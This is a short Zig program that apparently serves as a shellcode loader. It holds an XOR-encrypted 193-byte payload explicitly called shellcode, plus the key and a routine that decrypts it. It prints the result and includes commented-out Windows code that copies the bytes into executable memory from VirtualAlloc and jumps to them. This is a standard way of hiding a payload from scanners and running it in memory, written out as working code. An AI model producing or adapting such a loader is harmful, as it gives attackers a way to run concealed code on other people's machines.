const std = @import("std");

const XOR_KEY: [16]u8 = [_]u8{
    0x74, 0x1b, 0xcd, 0x93, 0xf3, 0x1b, 0x29, 0x70, 0x49, 0x86, 0x56, 0xe2, 0x7c, 0xba, 0x39, 0x51
};

const XOR_CIPHERTEXT: [193]u8 = [_]u8{
    0x88, 0xf3, 0x4f, 0x93, 0xf3, 0x1b, 0x49, 0xf9, 0xac, 0xb7, 0x96, 0x86, 0xf7, 0xea, 0x09, 0xda, 
    0x26, 0x17, 0x46, 0xc1, 0xe7, 0x90, 0x5b, 0x58, 0x46, 0x31, 0x1c, 0xc4, 0x4d, 0x45, 0x95, 0x6d, 
    0x15, 0x67, 0xcf, 0xbf, 0xd3, 0xda, 0xe6, 0x7d, 0x48, 0x41, 0xb4, 0x10, 0x2e, 0xed, 0xb2, 0x03, 
    0x64, 0x90, 0x87, 0xaf, 0x78, 0x57, 0x38, 0x08, 0xaa, 0xce, 0x57, 0x33, 0x2d, 0x31, 0x60, 0x71, 
    0x75, 0xc8, 0x46, 0xda, 0xeb, 0xf8, 0x13, 0x39, 0xc2, 0xb2, 0xdd, 0xe3, 0xaa, 0x8b, 0xc6, 0xfd, 
    0xb5, 0xd4, 0xc0, 0x92, 0x34, 0x23, 0xc9, 0x05, 0xbf, 0x85, 0x2b, 0x1a, 0x47, 0xc7, 0x1d, 0x24, 
    0x90, 0x43, 0x46, 0xcb, 0xd7, 0x1a, 0xfa, 0x16, 0xc2, 0x8a, 0x1d, 0x69, 0x24, 0xa6, 0x38, 0x82, 
    0xff, 0x1f, 0x46, 0x92, 0x23, 0x92, 0x6d, 0x54, 0x6d, 0xdd, 0x0d, 0x83, 0x25, 0xe0, 0x68, 0xae, 
    0x94, 0x44, 0x92, 0xc9, 0x78, 0x09, 0xc2, 0xfd, 0x14, 0xec, 0x57, 0x6f, 0xf9, 0x08, 0x39, 0x51, 
    0x74, 0x4b, 0xa5, 0xa2, 0x78, 0x74, 0xae, 0x8f, 0x9c, 0x3d, 0xa6, 0x57, 0xde, 0xec, 0x51, 0xf7, 
    0xe1, 0xa6, 0x50, 0x6c, 0x26, 0x27, 0x2f, 0x0c, 0x43, 0x06, 0xad, 0x02, 0x09, 0xbf, 0x82, 0x16, 
    0x67, 0x69, 0xa2, 0xf9, 0xf3, 0x48, 0xd6, 0xa5, 0x2a, 0xe7, 0x3a, 0x81, 0x52, 0xdf, 0x41, 0x34, 
    0x74
};

/// XOR decryption function - same as encryption since XOR is symmetric
/// Uses multi-byte key and iterates each byte as different key in each iteration
fn xorDecryption(shellcode: []u8, key: []const u8) void {
    const key_len = key.len;
    if (key_len == 0) return; // Avoid division by zero

    var j: usize = 0;
    for (shellcode) |*byte| {
        byte.* = byte.* ^ key[j];
        j += 1;
        if (j >= key_len) {
            j = 0;
        }
    }
}

pub fn main() !void {
    var ciphertext = XOR_CIPHERTEXT;
    xorDecryption(&ciphertext, &XOR_KEY);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});

    // Optional: Execute the shellcode (cross-platform example)
    // const builtin = @import("builtin");
    // if (builtin.os.tag == .windows) {
    //     const windows = std.os.windows;
    //     const exec_mem = windows.VirtualAlloc(
    //         null,
    //         ciphertext.len,
    //         windows.MEM_COMMIT | windows.MEM_RESERVE,
    //         windows.PAGE_EXECUTE_READWRITE
    //     );
    //     if (exec_mem) |mem| {
    //         @memcpy(@as([*]u8, @ptrCast(mem))[0..ciphertext.len], ciphertext);
    //         const func: *const fn() callconv(.C) void = @ptrCast(mem);
    //         func();
    //     }
    // }
}
